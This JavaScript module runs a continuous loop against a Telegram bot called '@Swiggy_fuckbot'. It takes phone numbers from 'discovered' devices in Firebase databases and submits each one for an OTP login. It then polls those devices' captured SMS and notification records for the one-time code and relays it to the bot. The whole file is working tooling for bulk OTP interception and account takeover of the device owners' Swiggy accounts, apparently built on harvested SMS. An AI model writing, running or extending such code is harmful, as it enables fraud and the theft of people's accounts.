/**
 * Browser Worker Engine — runs the full Telegram automation loop in the browser.
 *
 * Port of _python_worker_ref/worker.py using GramJS (browser MTProto).
 * Uses Svelte 5 runes for reactive state visible in UI.
 *
 * Flow per device:
 *   1. Send /cancel → get clean bot menu
 *   2. Click "Login via OTP" button
 *   3. Bot asks for 10-digit number → submit device phone
 *   4. Bot says "OTP sent" → start polling Firebase for incoming OTP SMS
 *   5. Detect OTP → send to bot
 *   6. Bot says "Login successful" → mark success, move to next device
 */

import { tgClient } from '$lib/telegram-client.js';
import { apiFetch } from '$lib/firebase.js';
import {
  engine as discoveryEngine,
  withNumber,
  onlineDevices,
  getDisplayPhone,
  getDiscoveredPhone,
  fetchAllDevices,
  onDiscovery,
  offDiscovery
} from '$lib/discovery-engine.svelte.js';
import { extractNumber } from '$lib/device-helpers.js';
import { registry } from '$lib/automation-registry.js';
import { automationState } from '$lib/automation-engine.svelte.js';

// ── Constants ────────────────────────────────────────────────────────────────
const MAX_LOG = 200;
const OTP_TIMEOUT_MS = 60000;
const OTP_POLL_INTERVAL_MS = 2000;
const WORKER_KEY = 'browser_worker:v2';
const RESPONSE_KEYWORD = 'swiggy';

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
function nowIST() {
  try {
    return new Date().toLocaleString('en-IN', {
      hour: '2-digit', minute: '2-digit', second: '2-digit',
      hour12: false, timeZone: 'Asia/Kolkata'
    });
  } catch { return new Date().toLocaleTimeString(); }
}

// ── Reactive State ───────────────────────────────────────────────────────────
export let worker = $state({
  // Connection
  telegramConnected: false,
  telegramUser: null, // { username, phone, firstName }
  connecting: false,
  loginPhase: 'IDLE', // IDLE | CONNECTING | WAITING_CODE | WAITING_2FA | CONNECTED | ERROR

  // Worker
  status: 'IDLE', // IDLE | RUNNING | PAUSED | STOPPED
  jobState: 'IDLE', // IDLE | STARTING | MENU_RECEIVED | WAITING_NUMBER | NUMBER_SUBMITTED | WAITING_OTP_REQUEST | WAITING_OTP | VERIFYING | CANCELLING

  // Current job
  currentJob: null, // { id, deviceId, phone, database, connId }
  currentMessage: '', // latest status message for UI

  // Configuration
  config: {
    apiId: '',
    apiHash: '',
    botUsername: '@Swiggy_fuckbot',
    otpTimeoutMs: OTP_TIMEOUT_MS,
    responseKeyword: RESPONSE_KEYWORD,
  },

  // Stats
  stats: {
    processed: 0,
    success: 0,
    failed: 0,
    timeout: 0,
    skipped: 0,
  },

  // Processed numbers (persistent)
  processedNumbers: {}, // { normalizedPhone: { status, reason, deviceId, timestamp } }
  usedDeviceKeys: new Set(), // "database|deviceId" keys used this session

  // Log
  logs: [],

  // Timing
  startedAt: null,
  elapsed: 0,
});

// ── Internal state (not reactive) ────────────────────────────────────────────
let _otpTimer = null;
let _pollTask = null;
let _pollAbort = null;
let _elapsedTimer = null;
let _messageUnsubscribe = null;
let _editUnsubscribe = null;
let _running = false;
let _loginClickedForJob = null;
let _baselineSignatures = new Set();
let _submittedOtps = new Set();
let _numberSubmittedAt = 0;
let _phoneCodeHash = null;
let _loginPhone = null;

// ── Logging ──────────────────────────────────────────────────────────────────
function addLog(msg, type = 'info') {
  worker.logs = [{ ts: nowIST(), msg, type, id: Date.now() + Math.random() }, ...worker.logs].slice(0, MAX_LOG);
}
export { addLog as workerLog };

export function clearWorkerLogs() { worker.logs = []; }

// ── Phone normalization ──────────────────────────────────────────────────────
function normalizePhone(value) {
  return String(value || '').replace(/\D/g, '');
}

function extractLocal10Digits(phone) {
  let digits = normalizePhone(phone);
  if (digits.startsWith('91') && digits.length === 12) digits = digits.slice(2);
  if (digits.length !== 10) throw new Error(`Expected 10-digit number, got: ${phone}`);
  return digits;
}

// ── Persistence ──────────────────────────────────────────────────────────────
function persistState() {
  if (typeof window === 'undefined') return;
  try {
    localStorage.setItem(WORKER_KEY, JSON.stringify({
      processedNumbers: worker.processedNumbers,
      stats: worker.stats,
      config: worker.config,
    }));
  } catch {}
}

function restoreState() {
  if (typeof window === 'undefined') return;
  try {
    let raw = localStorage.getItem(WORKER_KEY);
    if (!raw) {
      // Migrate from v1 without carrying over any private credentials
      const v1Raw = localStorage.getItem('browser_worker:v1');
      if (v1Raw) {
        try {
          const v1Data = JSON.parse(v1Raw);
          if (v1Data.config) {
            delete v1Data.config.apiId;
            delete v1Data.config.apiHash;
          }
          raw = JSON.stringify(v1Data);
          localStorage.setItem(WORKER_KEY, raw);
        } catch {}
        localStorage.removeItem('browser_worker:v1');
      }
    }
    if (!raw) return;
    const data = JSON.parse(raw);
    if (data.processedNumbers) worker.processedNumbers = data.processedNumbers;
    if (data.stats) worker.stats = { ...worker.stats, ...data.stats };
    if (data.config) worker.config = { ...worker.config, ...data.config };
    if (!worker.config.botUsername) worker.config.botUsername = '@Swiggy_fuckbot';
  } catch {}
}

export function clearWorkerProcessedPhone(phone) {
  const norm = normalizePhone(phone);
  if (norm && worker.processedNumbers[norm]) {
    delete worker.processedNumbers[norm];
    persistState();
  }
}

export function clearWorkerProcessedBatch(phones) {
  if (!Array.isArray(phones)) return;
  let changed = false;
  for (const p of phones) {
    const norm = normalizePhone(p);
    if (norm && worker.processedNumbers[norm]) {
      delete worker.processedNumbers[norm];
      changed = true;
    }
  }
  if (changed) persistState();
}

function isAlreadyProcessed(phone) {
  const norm = normalizePhone(phone);
  if (!norm) return true;
  if (registry.isAlreadyProcessed(norm)) return true;
  const rec = worker.processedNumbers[norm];
  if (!rec) return false;
  return ['successful', 'success', 'suspended', 'expired', 'invalid_number', 'invalid_otp', 'failed', 'rate_limited', 'already_registered'].includes(rec.status);
}

function recordProcessed(phone, status, reason = '', deviceId = '', database = '') {
  const norm = normalizePhone(phone);
  if (!norm) return;
  worker.processedNumbers[norm] = {
    phone: norm, status, reason: reason || status,
    deviceId, database, timestamp: new Date().toISOString(),
  };
  try {
    registry.record(norm, status, { reason, deviceId, database });
  } catch {}
  persistState();
}

// ── Extract OTP from message ─────────────────────────────────────────────────
function extractOtpCode(text) {
  if (!text) return null;
  const t = text.trim();
  // Explicit OTP pattern
  let m = t.match(/(?:otp|code|verification|password|pin|is)[^\d]{0,30}\b(\d{6})\b/i);
  if (m) return m[1];
  // Standalone 6-digit
  const six = t.match(/\b\d{6}\b/g);
  if (six) return six[0];
  // Fallback 4-8 digits near keyword
  m = t.match(/(?:otp|code|verification|password)[^\d]{0,30}\b(\d{4,8})\b/i);
  if (m) return m[1];
  return null;
}

// ═══════════════════════════════════════════════════════════════════════════
// TELEGRAM CONNECTION
// ═══════════════════════════════════════════════════════════════════════════

export async function connectTelegram() {
  if (worker.connecting) return;
  worker.connecting = true;
  worker.loginPhase = 'CONNECTING';
  addLog('🔌 Connecting to Telegram...', 'info');

  try {
    await tgClient.connect(worker.config.apiId, worker.config.apiHash);
    
    const authorized = await tgClient.isAuthorized();
    if (authorized) {
      const me = await tgClient.getMe();
      worker.telegramConnected = true;
      worker.telegramUser = {
        username: me.username || me.firstName || 'unknown',
        phone: me.phone || '',
        firstName: me.firstName || '',
      };
      worker.loginPhase = 'CONNECTED';
      addLog(`✅ Connected as @${worker.telegramUser.username}`, 'success');
    } else {
      worker.loginPhase = 'IDLE';
      addLog('📱 Not logged in. Enter your phone number to login.', 'info');
    }
  } catch (err) {
    worker.loginPhase = 'ERROR';
    addLog(`❌ Connection failed: ${err.message}`, 'error');
  } finally {
    worker.connecting = false;
  }
}

export async function loginWithPhone(phone) {
  worker.connecting = true;
  worker.loginPhase = 'CONNECTING';
  _loginPhone = phone;
  
  try {
    // Make sure client is connected first
    if (!tgClient.isConnected()) {
      await tgClient.connect(worker.config.apiId, worker.config.apiHash);
    }
    
    const result = await tgClient.sendCode(phone);
    _phoneCodeHash = result.phoneCodeHash;
    worker.loginPhase = 'WAITING_CODE';
    addLog('📨 OTP sent to your phone. Enter the code.', 'info');
  } catch (err) {
    worker.loginPhase = 'ERROR';
    addLog(`❌ Login failed: ${err.message || err}`, 'error');
  } finally {
    worker.connecting = false;
  }
}

export async function submitLoginCode(code) {
  worker.connecting = true;
  try {
    const user = await tgClient.submitCode(_loginPhone, code, _phoneCodeHash);
    worker.telegramConnected = true;
    worker.telegramUser = {
      username: user.username || user.firstName || 'unknown',
      phone: user.phone || _loginPhone || '',
      firstName: user.firstName || '',
    };
    worker.loginPhase = 'CONNECTED';
    addLog(`✅ Logged in as @${worker.telegramUser.username}`, 'success');
  } catch (err) {
    if (err.type === '2FA_REQUIRED' || err.errorMessage === 'SESSION_PASSWORD_NEEDED') {
      worker.loginPhase = 'WAITING_2FA';
      addLog('🔐 Two-factor authentication required. Enter your password.', 'info');
    } else {
      worker.loginPhase = 'ERROR';
      addLog(`❌ Code verification failed: ${err.message || err}`, 'error');
    }
  } finally {
    worker.connecting = false;
  }
}

export async function submit2FAPassword(password) {
  worker.connecting = true;
  try {
    const user = await tgClient.submit2FA(password);
    worker.telegramConnected = true;
    worker.telegramUser = {
      username: user.username || user.firstName || 'unknown',
      phone: user.phone || _loginPhone || '',
      firstName: user.firstName || '',
    };
    worker.loginPhase = 'CONNECTED';
    addLog(`✅ Logged in as @${worker.telegramUser.username}`, 'success');
  } catch (err) {
    worker.loginPhase = 'ERROR';
    addLog(`❌ 2FA failed: ${err.message || err}`, 'error');
  } finally {
    worker.connecting = false;
  }
}

export async function logoutTelegram() {
  await tgClient.logout();
  worker.telegramConnected = false;
  worker.telegramUser = null;
  worker.loginPhase = 'IDLE';
  addLog('🔓 Logged out from Telegram', 'info');
}

// ═══════════════════════════════════════════════════════════════════════════
// DEVICE SELECTION
// ═══════════════════════════════════════════════════════════════════════════

function getDevicePool() {
  // Get all online devices with phone numbers from the discovery engine
  const devices = [];
  for (const conn of discoveryEngine.connections) {
    if (!conn.enabled) continue;
    const entry = discoveryEngine.db[conn.id];
    if (!entry?.info) continue;
    
    for (const key of Object.keys(entry.keys || {})) {
      const info = entry.info[key];
      if (!info) continue;
      
      // Check online
      const status = info.status ?? info.connectionStatus ?? info.isOnline ?? info.online;
      const online = status === true || status === 'online' || status === 'connected';
      if (!online) continue;
      
      // Check has phone
      const phone = getDisplayPhone(conn.id, key, info) || getDiscoveredPhone(key);
      const normalized = normalizePhone(phone);
      if (!normalized || normalized.length < 5) continue;
      
      devices.push({
        deviceId: key,
        phone: phone,
        database: conn.url,
        connId: conn.id,
        conn,
      });
    }
  }
  return devices;
}

function selectNextDevice() {
  const pool = getDevicePool();
  
  for (const dev of pool) {
    const key = `${dev.database}|${dev.deviceId}`;
    if (worker.usedDeviceKeys.has(key)) continue;
    if (isAlreadyProcessed(dev.phone)) continue;
    
    worker.usedDeviceKeys.add(key);
    return dev;
  }
  return null;
}

// ═══════════════════════════════════════════════════════════════════════════
// BOT MESSAGE PARSING
// ═══════════════════════════════════════════════════════════════════════════

function findLoginButton(message) {
  const markup = message.replyMarkup;
  if (!markup?.rows) return null;
  
  for (let r = 0; r < markup.rows.length; r++) {
    for (let c = 0; c < markup.rows[r].buttons.length; c++) {
      const btn = markup.rows[r].buttons[c];
      const t = (btn.text || '').toLowerCase();
      if (!t || t.includes('multi')) continue;
      if (t.includes('login via otp') || t.includes('login with otp') || t.includes('login otp') || t.includes('otp login')) {
        return { row: r, col: c, text: btn.text };
      }
    }
  }
  // Second pass: login + otp anywhere
  for (let r = 0; r < markup.rows.length; r++) {
    for (let c = 0; c < markup.rows[r].buttons.length; c++) {
      const btn = markup.rows[r].buttons[c];
      const t = (btn.text || '').toLowerCase();
      if (!t || t.includes('multi')) continue;
      if (t.includes('login') && t.includes('otp')) return { row: r, col: c, text: btn.text };
    }
  }
  // Third pass: standalone login
  for (let r = 0; r < markup.rows.length; r++) {
    for (let c = 0; c < markup.rows[r].buttons.length; c++) {
      const btn = markup.rows[r].buttons[c];
      const t = (btn.text || '').toLowerCase();
      if (!t || t.includes('multi')) continue;
      if (t.includes('login') || t.includes('sign in')) return { row: r, col: c, text: btn.text };
    }
  }
  return null;
}

function classifyBotMessage(lower) {
  if (lower.includes('login successful') || lower.includes('successfully linked')) return 'success';
  if (lower.includes('account is suspended') || lower.includes('suspended') || lower.includes('blocked')) return 'suspended';
  if (lower.includes('attempts exceeded') || lower.includes('too many attempts') || lower.includes('retry after')) return 'rate_limited';
  if (lower.includes('otp expired') || lower.includes('code expired') || lower.includes('expired')) return 'expired';
  if (lower.includes('invalid otp') || lower.includes('is invalid') || lower.includes('otp verification failed')) return 'invalid_otp';
  if (lower.includes('already registered') || lower.includes('only allows logging in new accounts')) return 'already_registered';
  if (lower.includes('invalid number format') || lower.includes('invalid phone') || lower.includes('invalid mobile')) return 'invalid_number';
  if (lower.includes('otp request failed') || lower.includes('login failed') || lower.includes('request failed') ||
      lower.includes('something went wrong') || lower.includes('error occurred')) return 'failed';
  return null;
}

function isMenuMessage(lower, hasButtons) {
  return (lower.includes('welcome') || lower.includes('swiggy') || lower.includes('portal') || lower.includes('menu')) && hasButtons;
}

function isNumberPrompt(lower) {
  return (lower.includes('10-digit') || lower.includes('10 digit') || lower.includes('mobile number') || lower.includes('phone number')) &&
    !(lower.includes('otp sent') || lower.includes('6-digit') || lower.includes('suspended') || lower.includes('attempts exceeded'));
}

function isOtpRequesting(lower) {
  return (lower.includes('requesting otp') || (lower.includes('requesting') && lower.includes('otp'))) &&
    !(lower.includes('failed') || lower.includes('error') || lower.includes('otp sent'));
}

function isOtpSent(lower) {
  return (lower.includes('otp sent') || lower.includes('enter the 6-digit') || lower.includes('6-digit otp') ||
    lower.includes('enter the otp') || lower.includes('enter otp') || lower.includes('verification code')) &&
    !(lower.includes('requesting') || lower.includes('invalid otp') || lower.includes('expired') || lower.includes('failed'));
}

// ═══════════════════════════════════════════════════════════════════════════
// FIREBASE OTP POLLING
// ═══════════════════════════════════════════════════════════════════════════

function getOtpPollPaths(job) {
  if (!job) return [];
  const paths = [];
  const conn = discoveryEngine.connections.find(c => c.id === job.connId);
  if (!conn) return [];
  
  paths.push({ conn, path: `${conn.path}/${job.deviceId}` });
  
  // Also check notifications paths
  for (const prefix of ['notifications', 'notification', 'sms']) {
    paths.push({ conn, path: `${prefix}/${job.deviceId}` });
  }
  
  return paths;
}

function swiggyMessagesFromResponse(data) {
  if (!data || typeof data !== 'object') return [];
  const keyword = (worker.config.responseKeyword || 'swiggy').toLowerCase();
  const found = [];
  
  for (const [msgId, record] of Object.entries(data)) {
    if (!record || typeof record !== 'object') continue;
    
    const message = String(record.message ?? record.body ?? record.text ?? record.msg ?? record.sms ?? '');
    const sender = String(record.sender ?? record.address ?? record.from ?? record.title ?? record.appName ?? '');
    const content = String(record.content ?? record.bigText ?? record.subText ?? '');
    const fullText = `${message} ${content}`.toLowerCase();
    const senderLower = sender.toLowerCase();
    
    const hasKeyword = fullText.includes(keyword) || senderLower.includes(keyword);
    const hasOtpMarker = /\b(?:otp|verif|one.?time|code|token|pin|passcode)\b/.test(fullText) || extractOtpCode(message);
    
    if (!hasKeyword && !hasOtpMarker) continue;
    
    found.push({
      messageId: String(msgId),
      message: `${message} ${content}`.trim(),
      sender,
      dateTime: record.dateTime || '',
    });
  }
  return found;
}

async function captureBaseline(job) {
  _baselineSignatures = new Set();
  const paths = getOtpPollPaths(job);
  
  for (const { conn, path } of paths) {
    try {
      const { data } = await apiFetch(conn, path, 'GET', undefined, { orderBy: '"$key"', limitToLast: '50' });
      if (!data) continue;
      const msgs = swiggyMessagesFromResponse(data);
      for (const m of msgs) {
        _baselineSignatures.add(`${conn.id}:${path}:${m.messageId}`);
      }
    } catch {}
  }
  addLog(`📋 Baseline: ${_baselineSignatures.size} existing messages`, 'info');
}

async function pollForOtp(job) {
  const paths = getOtpPollPaths(job);
  
  for (const { conn, path } of paths) {
    try {
      const { data } = await apiFetch(conn, path, 'GET', undefined, { orderBy: '"$key"', limitToLast: '50' });
      if (!data) continue;
      
      const msgs = swiggyMessagesFromResponse(data);
      for (const m of msgs) {
        const sig = `${conn.id}:${path}:${m.messageId}`;
        if (_baselineSignatures.has(sig)) continue;
        
        // Check timestamp freshness
        if (m.messageId && /^\d{12,}$/.test(m.messageId)) {
          const msgTime = parseInt(m.messageId);
          if (_numberSubmittedAt > 0 && msgTime < _numberSubmittedAt - 5000) continue;
        }
        
        const code = extractOtpCode(m.message);
        if (!code) {
          _baselineSignatures.add(sig); // mark seen
          continue;
        }
        if (_submittedOtps.has(code)) continue;
        
        return { code, message: m.message, sender: m.sender, messageId: m.messageId };
      }
    } catch {}
  }
  return null;
}

// ═══════════════════════════════════════════════════════════════════════════
// WORKER CORE LOOP
// ═══════════════════════════════════════════════════════════════════════════

async function processOneDevice(device) {
  const bot = worker.config.botUsername;
  worker.currentJob = {
    id: `browser-${Date.now()}-${device.deviceId.slice(0, 8)}`,
    deviceId: device.deviceId,
    phone: device.phone,
    database: device.database,
    connId: device.connId,
    connName: device.conn?.name || '',
  };
  worker.currentMessage = `Starting: ${device.deviceId.slice(0, 14)}…`;
  worker.jobState = 'STARTING';
  addLog(`🚀 Processing ${device.deviceId.slice(0, 14)}… (${extractNumber(device.phone)})`, 'step');

  let localNumber;
  try {
    localNumber = extractLocal10Digits(device.phone);
  } catch (err) {
    addLog(`❌ Invalid phone: ${err.message}`, 'error');
    recordProcessed(device.phone, 'invalid_number', err.message, device.deviceId, device.database);
    worker.stats.failed++;
    worker.stats.processed++;
    return;
  }

  // ── Step 1: Reset conversation ─────────────────────────────────────────
  try {
    worker.currentMessage = 'Resetting bot conversation…';
    await tgClient.sendMessage(bot, '/cancel');
    await sleep(1000);
  } catch (err) {
    addLog(`⚠ /cancel error: ${err.message}`, 'warn');
  }

  // Wait for bot response (menu or cancel confirmation)
  const menuResult = await waitForBotState(bot, ['menu', 'cancel_confirm'], 8000);
  
  if (!_running) return;

  // ── Step 2: Click Login via OTP ────────────────────────────────────────
  worker.jobState = 'MENU_RECEIVED';
  worker.currentMessage = 'Looking for Login via OTP button…';
  
  const latestMsgs = await tgClient.getMessages(bot, 1);
  if (!latestMsgs || latestMsgs.length === 0) {
    addLog('❌ No messages from bot', 'error');
    await finishJob('failed', 'No bot messages');
    return;
  }
  
  const latestMsg = latestMsgs[0];
  const lower = (latestMsg.text || '').toLowerCase();
  
  // Check if already at number prompt
  if (isNumberPrompt(lower)) {
    worker.jobState = 'WAITING_NUMBER';
  } else {
    // Try to find and click login button
    const btnInfo = findLoginButton(latestMsg);
    if (btnInfo) {
      addLog(`🖱 Clicking "${btnInfo.text}"`, 'info');
      try {
        await tgClient.clickButton(latestMsg, btnInfo.row, btnInfo.col);
        worker.jobState = 'WAITING_NUMBER';
        await sleep(1500);
      } catch (err) {
        // If click fails, try sending /cancel and then /start
        addLog(`⚠ Button click failed: ${err.message}. Trying /start…`, 'warn');
        try {
          await tgClient.sendMessage(bot, '/start');
          await sleep(2000);
        } catch {}
      }
    } else {
      // No button found, try /start
      addLog('⚠ No login button found. Sending /start…', 'warn');
      try {
        await tgClient.sendMessage(bot, '/start');
        await sleep(2000);
      } catch {}
    }
    
    // Wait for number prompt
    const promptResult = await waitForBotState(bot, ['number_prompt'], 10000);
    if (!_running) return;
    if (!promptResult) {
      addLog('❌ Bot never asked for number', 'error');
      await finishJob('failed', 'Number prompt not received');
      return;
    }
  }

  // ── Step 3: Submit phone number ────────────────────────────────────────
  worker.jobState = 'NUMBER_SUBMITTED';
  worker.currentMessage = `Submitting ${localNumber}…`;
  addLog(`📤 Submitting number: ${localNumber}`, 'info');

  // Capture baseline BEFORE submitting
  await captureBaseline(worker.currentJob);
  _numberSubmittedAt = Date.now();
  _submittedOtps = new Set();

  try {
    await tgClient.sendMessage(bot, localNumber);
  } catch (err) {
    addLog(`❌ Send number failed: ${err.message}`, 'error');
    await finishJob('failed', `Number submission failed: ${err.message}`);
    return;
  }

  // ── Step 4: Wait for OTP sent confirmation ─────────────────────────────
  worker.currentMessage = 'Waiting for OTP confirmation…';
  const otpConfirm = await waitForBotState(bot, ['otp_sent', 'otp_requesting', 'error'], 15000);
  if (!_running) return;

  if (otpConfirm === 'error') {
    // Bot reported an error (suspended, invalid, etc.)
    return; // finishJob already called by message handler
  }

  if (!otpConfirm) {
    addLog('⏱ No OTP confirmation from bot', 'warn');
    await finishJob('timeout', 'OTP confirmation timeout');
    return;
  }

  // ── Step 5: Poll Firebase for OTP ──────────────────────────────────────
  worker.jobState = 'WAITING_OTP';
  worker.currentMessage = 'Polling for OTP on device…';
  addLog(`🔍 Polling Firebase for OTP (${worker.config.otpTimeoutMs / 1000}s timeout)…`, 'info');

  const deadline = Date.now() + worker.config.otpTimeoutMs;
  let otpFound = null;

  while (Date.now() < deadline && _running && worker.currentJob) {
    otpFound = await pollForOtp(worker.currentJob);
    if (otpFound) break;
    await sleep(OTP_POLL_INTERVAL_MS);
  }

  if (!_running || !worker.currentJob) return;

  if (!otpFound) {
    addLog(`⏱ OTP timeout for ${localNumber}`, 'warn');
    await finishJob('expired', `OTP timeout (${worker.config.otpTimeoutMs / 1000}s)`);
    return;
  }

  // ── Step 6: Submit OTP to bot ──────────────────────────────────────────
  worker.jobState = 'VERIFYING';
  worker.currentMessage = `Submitting OTP: ${otpFound.code}`;
  addLog(`🔑 OTP detected: ${otpFound.code} (from ${otpFound.sender})`, 'success');
  _submittedOtps.add(otpFound.code);

  try {
    await tgClient.sendMessage(bot, otpFound.code);
    addLog(`📤 OTP ${otpFound.code} sent to bot`, 'info');
  } catch (err) {
    addLog(`❌ OTP submit failed: ${err.message}`, 'error');
    await finishJob('failed', `OTP submission failed: ${err.message}`);
    return;
  }

  // ── Step 7: Wait for success/failure ───────────────────────────────────
  worker.currentMessage = 'Waiting for verification result…';
  const verifyResult = await waitForBotState(bot, ['success', 'error'], 45000);
  if (!_running) return;

  if (verifyResult === 'success') {
    addLog(`🎉 SUCCESS: ${localNumber} verified!`, 'success');
    recordProcessed(device.phone, 'successful', 'Login verified', device.deviceId, device.database);
    worker.stats.success++;
  } else {
    // error or timeout — finishJob may have been called by message handler
    if (worker.currentJob) {
      addLog(`❌ Verification failed for ${localNumber}`, 'error');
      await finishJob('failed', 'Verification failed or timeout');
    }
    return;
  }

  worker.stats.processed++;
  worker.currentJob = null;
  worker.jobState = 'IDLE';
  worker.currentMessage = '';
}

async function waitForBotState(bot, expectedStates, timeoutMs) {
  const deadline = Date.now() + timeoutMs;
  
  while (Date.now() < deadline && _running) {
    await sleep(800);
    
    try {
      const msgs = await tgClient.getMessages(bot, 1);
      if (!msgs || msgs.length === 0) continue;
      
      const msg = msgs[0];
      if (msg.out) continue; // our own message
      
      const text = (msg.text || '').toLowerCase();
      const hasButtons = !!msg.replyMarkup?.rows?.length;
      
      for (const state of expectedStates) {
        switch (state) {
          case 'menu':
            if (isMenuMessage(text, hasButtons)) return 'menu';
            break;
          case 'cancel_confirm':
            if (text.includes('conversation cancelled') || text.includes('cancelled')) return 'cancel_confirm';
            break;
          case 'number_prompt':
            if (isNumberPrompt(text)) return 'number_prompt';
            break;
          case 'otp_sent':
            if (isOtpSent(text)) return 'otp_sent';
            break;
          case 'otp_requesting':
            if (isOtpRequesting(text)) return 'otp_requesting';
            break;
          case 'success':
            if (text.includes('login successful') || text.includes('successfully linked')) return 'success';
            break;
          case 'error': {
            const cls = classifyBotMessage(text);
            if (cls) {
              const phone = worker.currentJob?.phone;
              if (phone) {
                recordProcessed(phone, cls, text, worker.currentJob?.deviceId, worker.currentJob?.database);
              }
              addLog(`⚠ Bot: ${cls} — ${text.slice(0, 80)}…`, 'error');
              worker.stats.failed++;
              worker.stats.processed++;
              worker.currentJob = null;
              worker.jobState = 'IDLE';
              return 'error';
            }
            break;
          }
        }
      }
    } catch {}
  }
  
  return null;
}

async function finishJob(status, error = '') {
  const phone = worker.currentJob?.phone;
  const deviceId = worker.currentJob?.deviceId;
  const database = worker.currentJob?.database;
  
  if (phone && status !== 'successful') {
    recordProcessed(phone, status, error, deviceId, database);
  }
  
  if (status === 'expired' || status === 'timeout') worker.stats.timeout++;
  else if (status !== 'successful') worker.stats.failed++;
  worker.stats.processed++;
  
  worker.currentJob = null;
  worker.jobState = 'IDLE';
  worker.currentMessage = '';
  
  // Send /cancel to clean up
  try {
    await tgClient.sendMessage(worker.config.botUsername, '/cancel');
  } catch {}
  
  await sleep(1500);
  persistState();
}

// ═══════════════════════════════════════════════════════════════════════════
// PUBLIC API
// ═══════════════════════════════════════════════════════════════════════════

export function initWorker() {
  if (typeof window === 'undefined') return;
  restoreState();
}

// ── Discovery → Browser-Worker Bridge ───────────────────────────────────────────
// When discovery finds a new number, set a flag so the idle wait loop
// exits early and picks up the new device without waiting 30 seconds.
let _newDiscoverySignal = false;
function _onDiscoveredForWorker(deviceId, phoneNumber, connId, connName) {
  if (!_running) return;
  const norm = normalizePhone(phoneNumber);
  if (!norm || norm.length < 5) return;
  if (isAlreadyProcessed(phoneNumber)) return;
  _newDiscoverySignal = true;
  addLog(`🆕 Discovery → Worker: ${deviceId.slice(0, 12)}… (${norm}) is now in the pool`, 'success');
}

export async function startWorker() {
  if (worker.status === 'RUNNING') return;
  if (!automationState.enabled) {
    addLog('❌ Automation is currently DISABLED. Enable it in Settings first.', 'error');
    return;
  }
  if (!worker.telegramConnected) {
    addLog('❌ Connect to Telegram first', 'error');
    return;
  }
  
  _running = true;
  worker.status = 'RUNNING';
  worker.startedAt = new Date().toISOString();
  worker.usedDeviceKeys = new Set();
  addLog('🚀 Browser worker started — runs continuously until manually stopped', 'success');

  // Register discovery → worker bridge
  onDiscovery(_onDiscoveredForWorker);

  // Elapsed timer
  _elapsedTimer = setInterval(() => {
    if (worker.startedAt) {
      worker.elapsed = Math.floor((Date.now() - new Date(worker.startedAt).getTime()) / 1000);
    }
  }, 1000);
  
  // Refresh devices
  await fetchAllDevices();
  
  // ── Continuous main loop — NEVER exits unless user stops ──
  let consecutiveEmptyPolls = 0;
  while (_running) {
    if (!automationState.enabled) {
      stopWorker();
      break;
    }
    const device = selectNextDevice();
    
    if (!device) {
      consecutiveEmptyPolls++;
      
      if (consecutiveEmptyPolls === 1) {
        addLog('📭 No new devices to process right now. Waiting for new devices...', 'info');
      }
      
      // Wait and re-check: break early if a new number is discovered
      worker.currentMessage = `Waiting for new devices… (up to 30s)`;
      _newDiscoverySignal = false;
      for (let i = 0; i < 30 && _running && !_newDiscoverySignal; i++) {
        await sleep(1000);
      }
      if (!_running) break;
      if (_newDiscoverySignal) {
        addLog('⚡ New discovery woke worker — checking pool now…', 'info');
        _newDiscoverySignal = false;
      }
      
      // Re-fetch device list to discover newly available devices
      try {
        await fetchAllDevices();
      } catch {}
      
      // Every 5 empty polls, log a keep-alive message
      if (consecutiveEmptyPolls % 5 === 0) {
        addLog(`⏳ Still waiting for new devices (${consecutiveEmptyPolls * 30}s idle)…`, 'info');
      }
      continue;
    }
    
    // Reset empty poll counter when we find work
    consecutiveEmptyPolls = 0;
    
    try {
      await processOneDevice(device);
    } catch (err) {
      addLog(`💥 Error processing device: ${err.message}`, 'error');
      worker.currentJob = null;
      worker.jobState = 'IDLE';
      // Don't stop — continue to next device
    }
    
    if (!_running) break;
    
    // Brief pause between devices
    addLog('⏳ Waiting 3s before next device…', 'info');
    await sleep(3000);
    
    // Periodically refresh device list
    if (worker.stats.processed % 5 === 0) {
      try {
        await fetchAllDevices();
      } catch {}
    }
  }
  
  stopTimers();
  worker.status = 'STOPPED';
  _running = false;
  persistState();
  addLog('🛑 Worker stopped by user', 'info');
}

export function pauseWorker() {
  _running = false;
  worker.status = 'PAUSED';
  stopTimers();
  addLog('⏸ Worker paused', 'warn');
  persistState();
}

export function stopWorker() {
  _running = false;
  _newDiscoverySignal = false;
  offDiscovery(_onDiscoveredForWorker);
  worker.status = 'STOPPED';
  worker.currentJob = null;
  worker.jobState = 'IDLE';
  worker.currentMessage = '';
  stopTimers();
  addLog('⏹ Worker stopped', 'info');
  persistState();
}

export function resetProcessedNumbers() {
  worker.processedNumbers = {};
  worker.usedDeviceKeys = new Set();
  worker.stats = { processed: 0, success: 0, failed: 0, timeout: 0, skipped: 0 };
  persistState();
  addLog('🗑 Processed numbers cleared', 'info');
}

export function formatElapsed(secs) {
  const h = Math.floor(secs / 3600);
  const m = Math.floor((secs % 3600) / 60);
  const s = secs % 60;
  if (h > 0) return `${h}h ${m}m ${s}s`;
  if (m > 0) return `${m}m ${s}s`;
  return `${s}s`;
}

export async function skipCurrentDevice() {
  if (!worker.currentJob) return;
  addLog(`⏭ Skipping current device (${worker.currentJob.deviceId.slice(0, 10)}…)`, 'warn');
  await finishJob('skipped', 'Manually skipped');
}

export async function sendDirectBotCommand(text) {
  const cmd = String(text || '').trim();
  if (!cmd) return false;
  addLog(`📤 Direct bot command: ${cmd}`, 'info');
  try {
    await tgClient.sendMessage(worker.config.botUsername, cmd);
    return true;
  } catch (err) {
    addLog(`❌ Failed to send command: ${err.message}`, 'error');
    return false;
  }
}

export async function sendBotStart() {
  return sendDirectBotCommand('/start');
}

export async function sendBotCancel() {
  if (worker.jobState !== 'IDLE') {
    worker.jobState = 'IDLE';
    worker.currentJob = null;
    worker.currentMessage = '';
  }
  return sendDirectBotCommand('/cancel');
}

function stopTimers() {
  if (_elapsedTimer) { clearInterval(_elapsedTimer); _elapsedTimer = null; }
  if (_otpTimer) { clearTimeout(_otpTimer); _otpTimer = null; }
}
